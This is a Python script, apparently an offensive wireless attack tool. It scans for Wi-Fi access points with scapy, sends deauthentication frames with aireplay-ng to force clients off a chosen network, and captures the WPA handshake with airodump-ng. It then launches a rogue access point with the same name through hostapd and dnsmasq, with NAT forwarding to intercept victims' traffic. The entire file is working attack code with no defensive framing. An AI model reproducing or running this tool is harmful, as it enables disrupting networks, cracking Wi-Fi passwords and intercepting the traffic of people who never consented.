from multiprocessing import Process
from scapy.all import *
import time
import os
import conf_files as cf

iface = ''
bssid_name = ""
essid_name = ""
channel_no = 0
bssid_list = []
essid_list = []
channel_list = []

def wifi_scanner():
    #os.system('airodump-ng ' + iface)
    print("Scanning for access points...")
    print("press CTRL+C to stop the scanning")
    print("Index \tChannel \t MAC \t\t ESSID")
    #start the channel changer
    sniff(iface = iface, prn = wifi_sniffer)
    #stop the channel changer
    
def wifi_sniffer(pkt) :
    global bssid_list, essid_list, channel_list
    # if packet has 802.11 layer
    if pkt.haslayer(Dot11Beacon):
            if pkt.addr2 not in bssid_list:
                channel = pkt.channel
                channel_list.append(channel)
                #bssid_list.append(pkt.addr2)
                bssid = pkt[Dot11].addr2
                bssid_list.append(bssid)
                #essid_list.append(pkt.info)
                essid = pkt[Dot11Elt].info.decode()
                essid_list.append(essid)
                print(len(bssid_list),'\t ',channel,'\t ',bssid,'\t ',essid)

def deauth():
    os.system(f"aireplay-ng -0 1 -a {bssid_name} {iface}")

def handshake_capture(): #look at fixing handshake capture and spoof mac address of client device once connected to rogue access point??
        global essid_name, bssid_name, channel_no
        mac_adder = int(input("\nEnter the index of the network you want to target: ")) - 1
        bssid_name = bssid_list[mac_adder]
        essid_name = essid_list[mac_adder]
        channel_no = channel_list[mac_adder]
        print("\nNetwork to target:\n")
        print(channel_no,'\t',bssid_name,'\t', essid_name)
        dist = int(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
        print("Capturing 4-Way handshake [{}]...".format(bssid_name))
        #start deauthentication process
        p_deauth = Process(target = deauth)
        p_deauth.start()
        #os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface} | xterm -e airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
        os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
        #stop deauthentication process
        p_deauth.terminate()
        return essid_name

#turns the wifi interface into monitor mode for scanning
def setup_monitor(iface):
    try:
        os.system(f'airmon-ng start {iface}')
    except:
        os.system('Failed to setup interface in monitor mode')
        sys.exit(1)
    iface = str(iface)+'mon'
    return iface

def disable_monitor(iface):
    try:
        os.system(f'airmon-ng stop {iface}')
    except:
        os.system('Failed to setup interface in managed mode')
        sys.exit(1)
    return iface

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {iface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def create_configs(iface, essid, channel_no):
    cf.create_hostapd(iface, essid, channel_no)
    cf.create_dnsmasq(iface)

def rogue_ap():
    global iface, bssid_name
    os.system('sudo killall dnsmasq')
    # os.system(f'ifconfig {iface} down')
    # os.system(f'macchanger --mac={bssid_name} {iface}')
    # os.system(f'ifconfig {iface} up')
    os.system(f'ifconfig {iface} up 192.168.2.1 netmask 255.255.255.0')
    os.system('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
    #ip forwarding
    os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
    os.system(f'iptables --append FORWARD --in-interface {iface} -j ACCEPT')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
    
def main():
    global iface, essid_name, bssid_name, channel_no
    iface = setup_monitor("wlan0")
    print("\nWhen Done Press CTRL+C")
    time.sleep(2)
    p = Process(target = change_channel)
    p.start()
    wifi_scanner()
    p.terminate()
    handshake_capture()
    print("Fake Access Point\nWhen Done Press CTRL+C")
    disable_monitor(iface)
    time.sleep(2.0)
    create_configs(iface, essid_name, channel_no)
    rogue_ap()
    
if __name__ == "__main__":
    main()